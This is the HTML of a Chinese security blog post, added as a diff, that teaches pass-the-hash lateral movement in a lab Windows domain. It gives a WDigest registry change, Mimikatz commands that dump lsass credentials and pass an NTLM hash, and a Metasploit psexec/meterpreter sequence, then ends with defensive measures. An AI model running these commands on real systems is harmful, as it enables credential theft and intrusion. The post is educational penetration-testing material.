@@ -1,0 +1,616 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="yhy的个人博客">
+  <meta name="author" content="yhy">
+  <meta name="keywords" content="">
+  
+  <title>哈希传递 - yhy&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"fireline.fun","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"https://hm.baidu.com/hm.js?613daf119ed9302ff8cc0e60daf78bfe","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>YHY</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="哈希传递">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      yhy
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-02-14 10:30" pubdate>
+        2021年2月14日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      14
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">哈希传递</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年3月5日 上午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <blockquote>
+<p>  笙歌间错华筵启。喜新春新岁。菜传纤手青丝细。和气入、东风里。</p>
+<p>  幡儿胜儿都姑媂。戴得更忔戏。愿新春以后，吉吉利利，百事都如意。 </p>
+</blockquote>
+<h2 id="0x01-哈希传递攻击概念"><a href="#0x01-哈希传递攻击概念" class="headerlink" title="0x01 哈希传递攻击概念"></a>0x01 哈希传递攻击概念</h2><p>在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登陆内网中的其他计算机。</p>
+<p>在Windows系统中，通常会使用NTLM身份认证，NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)。攻击者获得有效的用户名和用户密码哈希值后，他们便能够使用该信息通过LM或NTLM身份验证向远程服务器或服务进行身份验证，而无需进行<strong>暴力破解</strong>散列以获取明文密码（此技术发布之前需要此密码）。该攻击利用了身份验证协议中的一种实现缺陷，即每次<strong>会话之间</strong>的密码散列保持静态，直到下次更改密码为止。</p>
+<p>从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash。在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，只能读取哈希值。虽然此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br></code></pre></td></tr></table></figure>
+
+<p>但是，这种方式要求系统重启或者用户重新登录，在实战中操作起来成功率还是比较低的。如果攻击者拥有用户密码的哈希值，则无需强行使用明文密码；他们可以简单地使用他们已经收获的任意用户帐户的哈希值来针对远程系统进行身份验证并模拟该用户。换句话说，从攻击者的角度来看，哈希在功能上等同于生成它们的原始密码。</p>
+<p>因此，攻击者如果使用工具将散列值传递到其他计算机中，进行权限验证，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，实现对计算机的控制。</p>
+<h2 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a>0x02 利用方法</h2><h3 id="环境搭配"><a href="#环境搭配" class="headerlink" title="环境搭配"></a>环境搭配</h3><p>域搭建可以参考<a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483820&idx=1&sn=f49f393a5698e366df99ddd0d9269829&chksm=c28298b5f5f511a36cd92fb722ce3b0658a9ee6195f5ad3f89266a4dc2ac3f022fdc8d5b578e#rd">Windows组策略提权实验</a></p>
+<p>将一台win7添加到域控（win8）中</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160244.png" srcset="/img/loading.gif" lazyload alt="image-20210214145116625"></p>
+<p>登录一下域账户，之后退出域账户，然后切换为本地账户</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160250.png" srcset="/img/loading.gif" lazyload alt="image-20210214145726732"></p>
+<p>切换本地账户</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160257.png" srcset="/img/loading.gif" lazyload alt="image-20210214145957319"></p>
+<h3 id="Mimikatz-交互式获取"><a href="#Mimikatz-交互式获取" class="headerlink" title="Mimikatz 交互式获取"></a>Mimikatz 交互式获取</h3><p>读取lsass进程的信息，获取hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">privilege::debug<br>sekurlsa::logonPasswords<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160302.png" srcset="/img/loading.gif" lazyload alt="image-20210214152209729"></p>
+<p>获取终端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">privilege::debug<br>sekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup &#x2F;ntlm:4075bdc2e63781b034a034102356063a<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160306.png" srcset="/img/loading.gif" lazyload alt="image-20210214152128620"></p>
+<p>会弹出一个交互式的终端,这个终端以及伪造为我们指定的hash和用户，可以直接访问smb服务，我们可以通过copy文件，然后执行计划任务去拿到shell（使用atexec攻击）。</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160310.png" srcset="/img/loading.gif" lazyload alt="image-20210214152835360"></p>
+<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>需要使用<code>exploit/windows/smb/psexec</code></p>
+<p>注意这里填入的哈希是<code>LM Hash:NTLM Hash</code>, 当系统默认不支持LM hash，LM hash可以设定为任意值。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apl">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec<br>set payload windows&#x2F;meterpreter&#x2F;bind_tcp<br>set RHOST 172.16.27.10<br>set smbuser administrator<br>set SMBPass 00000000000000000000000000000000:4075bdc2e63781b034a034102356063a<br>run<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160316.png" srcset="/img/loading.gif" lazyload alt="image-20210214154108503"></p>
+<p>当然还有一些其它利用方法，比如：Cobalt Strike 抓取、powershell读取、 SAM表离线获取hash、wmiexec利用hash获取shell等等</p>
+<h2 id="0x03-防范措施"><a href="#0x03-防范措施" class="headerlink" title="0x03 防范措施"></a>0x03 防范措施</h2><h3 id="KB2871997补丁的影响"><a href="#KB2871997补丁的影响" class="headerlink" title="KB2871997补丁的影响"></a>KB2871997补丁的影响</h3><p>防范首先想到打补丁，微软也早在2014年5月发布了KB2871997补丁，该补丁禁止通过本地管理员权限与远程计算机进行连接，其后果就是：无法通过本地管理员权限对远程计算机使用Psexec、WMI、smbecec等，也无法访问远程的文件共享等。</p>
+<p>但实际上就算打了KB2871997补丁后，Administrator账号(SID为500)也是例外的，使用该账户的NTLM Hash依然可以进行哈希传递。</p>
+<blockquote>
+<p>  KB2871997补丁并不能真正防止哈希传递，只是在一定程度上缓解了PTH的问题。</p>
+<p>  浅探内网横向移动-Pass The Hash  <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8117#toc-11">https://xz.aliyun.com/t/8117#toc-11</a></p>
+<p>  KB22871997是否真的能防御PTH攻击？<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193150">https://www.anquanke.com/post/id/193150</a></p>
+</blockquote>
+<h3 id="防御-mimikatz-攻击"><a href="#防御-mimikatz-攻击" class="headerlink" title="防御 mimikatz 攻击"></a>防御 mimikatz 攻击</h3><p>mimikatz在抓取散列值或明文密码时，需要用到Debug权限（因为mimikatz需要和lsass进程进行交互，如果没有Debug权限，mimikatz将不能读取lsass进程里的密码）。而Debug权限归本地管理员Administrator所有,目的是确定哪些用户可以将调试器附加到任何进程或内核中，但一般Administrator不会用到这个权限(除非是系统进程)。<br><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160322.png" srcset="/img/loading.gif" lazyload alt="image-20210214155950651"></p>
+<p>所以在配置用户权限时，可以将拥有Debug权限的本地管理员从Administrator组中移除。重启系统之后，在运行mimikatz，在第一步”privilege::debug”时就会报错了。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Windows%E6%8F%90%E6%9D%83/">Windows提权</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/02/21/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">域渗透-DCSync和黄金票据</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/02/07/Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/">
+                        <span class="hidden-mobile">Windows系统散列值获取</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.lazyComments('valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#valine",
+          app_id: "vID2hnAAj71HlTtLcwO4InbY-gzGzoHsz",
+          app_key: "GB9a9tvf5zPbYaxUShE01qk1",
+          placeholder: "说点什么",
+          path: window.location.pathname,
+          avatar: "robohash",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: true,
+          recordIP: false,
+          serverURLs: "https://vid2hnaa.lc-cn-n1-shared.com",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+  <div class="col-lg-7 mx-auto nopadding-x-md">
+    <div class="container custom post-custom mx-auto">
+      <img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210320180703.jpg" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
+    </div>
+  </div>
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/yhy0" target="_blank" rel="nofollow noopener"><span>YHY</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?https://hm.baidu.com/hm.js?613daf119ed9302ff8cc0e60daf78bfe";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
